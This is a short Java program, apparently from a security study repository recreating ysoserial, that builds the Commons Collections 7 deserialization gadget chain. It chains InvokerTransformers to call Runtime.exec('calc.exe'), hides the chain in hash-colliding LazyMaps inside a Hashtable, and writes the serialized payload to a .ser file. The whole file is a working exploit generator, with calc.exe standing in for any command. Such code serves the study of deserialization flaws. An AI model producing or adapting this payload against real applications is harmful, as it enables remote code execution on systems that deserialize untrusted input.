package CommonsCollections7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws IOException {
        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}
                        ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };

        ChainedTransformer chain = new ChainedTransformer(trans);

        //构造两个hash值相同的lazymap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chain);
        lazyMap1.put("zZ",1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap2.put("yy",1);

        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1,1);
        hashTable.put(lazyMap2,2);

        lazyMap2.remove("zZ");

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections7.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(hashTable);

    }
}
